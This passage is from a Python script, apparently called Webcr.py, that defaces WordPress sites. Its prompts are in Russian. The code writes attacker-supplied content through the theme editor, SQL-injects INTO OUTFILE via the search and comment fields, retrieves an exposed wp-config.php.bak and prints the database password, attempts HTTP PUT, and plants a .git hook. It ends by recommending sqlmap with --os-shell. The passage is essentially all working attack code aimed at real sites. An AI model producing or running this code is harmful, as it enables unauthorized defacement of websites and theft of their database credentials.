file_path = file_input.get('value', '')
                            # Update index.php or header.php
                            update_data = {
                                'file': file_path,
                                'newcontent': f'<?php echo "{new_content}"; ?>',
                                'action': 'update'
                            }
                            update_r = self.session.post(theme_editor, data=update_data, timeout=10)
                            if update_r.status_code == 200:
                                print("[+] Theme modified successfully")
                                return True
            except:
                continue
        return False
    
    def wp_sqli_attack(self, new_content):
        # Try SQLi in s parameter (search)
        sqli_url = urljoin(self.target, '/?s=' + quote("' UNION SELECT '" + new_content + "' INTO OUTFILE '/var/www/html/index.html' -- "))
        try:
            r = self.session.get(sqli_url, timeout=10)
            # Check if injection worked
            check = self.session.get(self.target, timeout=10)
            if new_content in check.text:
                print("[+] SQLi via search parameter successful")
                return True
        except:
            pass
        
        # Try via comment parameter
        comm_url = urljoin(self.target, '/wp-comments-post.php')
        data = {'comment': "' UNION SELECT '" + new_content + "' INTO OUTFILE '/var/www/html/index.html' -- ", 'submit': 'Post'}
        try:
            r = self.session.post(comm_url, data=data, timeout=10)
            check = self.session.get(self.target, timeout=10)
            if new_content in check.text:
                print("[+] SQLi via comments successful")
                return True
        except:
            pass
        return False
    
    def wp_config_leak(self):
        wp_config = urljoin(self.target, '/wp-config.php.bak')
        try:
            r = self.session.get(wp_config, timeout=5)
            if r.status_code == 200 and 'DB_PASSWORD' in r.text:
                print("[+] wp-config.php.bak exposed")
                # Extract DB credentials
                db_pass = re.search(r"DB_PASSWORD', '([^']+)'", r.text)
                if db_pass:
                    print(f"[+] Database password: {db_pass.group(1)}")
                return True
        except:
            pass
        return False
    
    def generic_attack(self, new_content):
        print("[*] Trying generic attacks")
        # Try PUT method
        put_url = urljoin(self.target, 'index.html')
        try:
            r = self.session.put(put_url, data=new_content, timeout=10)
            if r.status_code in [200, 201, 204]:
                check = self.session.get(self.target)
                if new_content in check.text:
                    print("[+] PUT method successful")
                    return True
        except:
            pass
        
        # Try .git exploitation
        git_url = urljoin(self.target, '.git/config')
        try:
            r = self.session.get(git_url, timeout=5)
            if r.status_code == 200:
                print("[+] .git exposed")
                hook_url = urljoin(self.target, '.git/hooks/post-receive')
                hook_content = f"#!/bin/sh\necho '{new_content}' > ../index.html"
                self.session.put(hook_url, data=hook_content)
                return True
        except:
            pass
        
        return False

def main():
    if len(sys.argv) != 2:
        print("Использование: python3 Webcr.py <URL>")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith('http'):
        target = 'https://' + target
    
    print("Введите HTML/текст для отображения на сайте: ")
    new_content = sys.stdin.readline().strip()
    if not new_content:
        new_content = "<h1>HACKED</h1>"
    
    defacer = WordPressDefacer(target)
    if defacer.full_attack(new_content):
        print("\n[+] УСПЕХ! Содержимое сайта изменено.")
        print(f"[+] Проверьте: {target}")
    else:
        print("\n[-] Не удалось изменить содержимое.")
        print("[*] Рекомендации:")
        print("    1. Запустите WPScan: wpscan --url " + target)
        print("    2. Попробуйте sqlmap: sqlmap -u \"" + target + "?p=1\" --os-shell")
        print("    3. Проверьте XML-RPC: curl -X POST " + target + "/xmlrpc.php")

if name == "main":
    main()
